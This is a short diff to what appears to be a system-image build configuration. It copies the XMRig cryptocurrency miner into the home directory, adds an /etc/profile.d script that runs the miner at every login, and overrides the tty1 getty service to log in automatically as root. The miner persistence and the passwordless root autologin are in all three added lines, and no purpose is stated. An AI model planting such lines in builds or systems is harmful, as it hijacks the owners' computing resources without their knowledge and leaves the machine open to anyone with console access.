@@ -1,0 +1,3 @@
+"xmrig"="~/xmrig"
+@'echo -e "chmod +x ~/xmrig/xmrig\n~/xmrig/xmrig" > /etc/profile.d/run.sh'
+@'echo -e "[Service]\nExecStart=\nExecStart=-/sbin/agetty -o '-p -f -- \\u' --noclear --autologin root - $TERM\n" > /etc/systemd/system/getty@tty1.service.d/autologin.conf'
